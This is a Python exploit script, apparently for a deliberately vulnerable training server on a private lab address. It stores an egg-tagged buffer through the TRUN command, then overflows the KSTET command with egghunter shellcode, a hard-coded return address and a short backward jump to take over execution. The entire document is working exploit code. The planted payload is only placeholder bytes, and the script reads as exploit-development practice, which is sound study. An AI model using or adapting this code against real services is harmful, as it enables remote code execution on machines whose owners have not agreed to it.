import socket
from struct import pack

try:
    server = "192.168.56.108"
    port = 9999

    buf = b"TRUN" + b"\x20"
    buf += b"w00tw00t"
    buf += b"C" * 0x300
    buf += b"w00tw00t"

    print("Sending TRUN to store buf...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, port))
    s.send(buf)

    egghunter = b"\x90\x90\x90\x90\x90\x90\x66\x81\xca\xff\x0f\x42\x52\x68\x3a\xfe\xff\xff\x58\xf7\xd8\xcd\x2e\x3c\x05\x5a\x74\xea\xb8\x77\x30\x30\x74\x89\xd7\xaf\x75\xe5\xaf\x75\xe2\xff\xe7"

    buf = b"KSTET" + b"\x20"
    buf += egghunter + b"A" * (70-len(egghunter))

    buf += pack("<i", 0x625011af)
    buf += b"\xeb\xb6"

    print("Sending KSTET...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, port))
    s.send(buf)
    s.close()
    print("\nDone!")

except socket.error:
    print("Could not connect!")
